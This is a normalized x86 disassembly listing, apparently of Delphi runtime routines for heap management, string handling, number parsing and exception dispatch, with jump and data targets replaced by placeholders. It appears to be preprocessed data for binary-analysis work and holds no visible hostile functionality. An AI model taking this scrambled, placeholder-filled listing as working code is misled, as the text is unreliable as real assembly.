mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401398
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403ad0
jmp r-xdata
call sub_401ec8
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e40
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd8
sub_402454
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec8
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fcc
test al al
je r-xdata
call sub_401bd8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c9c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e40
jmp r-xdata
sub_402630
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026e1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402454
test al al
je r-xdata
push rw-data
call sub_401390
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402120
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028f0
mov eax ebx
call sub_4022b0
retn
push rw-data
call sub_401398
sub_4026f4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402850
sub_402714
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402850
sub_402734
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402850
mov [ ecx ] eax
mov al 0x2
jmp sub_402850
retn
mov [ ecx ] eax
retn
sub_4027c4
push ebx
push esi
call sub_405fd8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405fd8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405fd8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402804
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405fd8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40288c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028f0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402930
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_401254
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404634
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_401254
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_401254
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401254
cmp eax ebx
jbe r-xdata
push ebx
call sub_401254
mov ebx eax
jmp r-xdata
push ebx
call sub_401254
mov ebx eax
jmp r-xdata
push ebx
call sub_401254
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401254
mov ebx eax
jmp r-xdata
push ebx
call sub_401254
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a1c
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fe8
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_401294
mov ecx eax
mov edx esp
mov eax ebx
call sub_4040d8
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402930
mov edi eax
test esi esi
je r-xdata
sub_402ac8
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40287c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b1c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40287c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40287c
jmp r-xdata
sub_402b74
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_402b90
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c14
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c84
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ca4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d84
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402dc4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e77 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e77 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e77
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030b0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030e0
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012ec
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403151
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012e4
retn
sub_4031d4
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_40327c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032d4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a18
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032f4
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4058c0
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033a8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033b8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033af
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032f4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4058c0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033b8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033fc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403484
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40343c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40346c
push eax
push ecx
mov eax [ eax ]
call sub_40343c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fdc
call [ rw-data ]
sub_4034b4
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40343c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034dc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40352c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_40356c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035bc
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035e5
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403650
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_40368c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036a0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036b4
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036d4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4036b4
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403738
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031a4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405fd8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036a0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403650
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403864
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031a4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403650
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
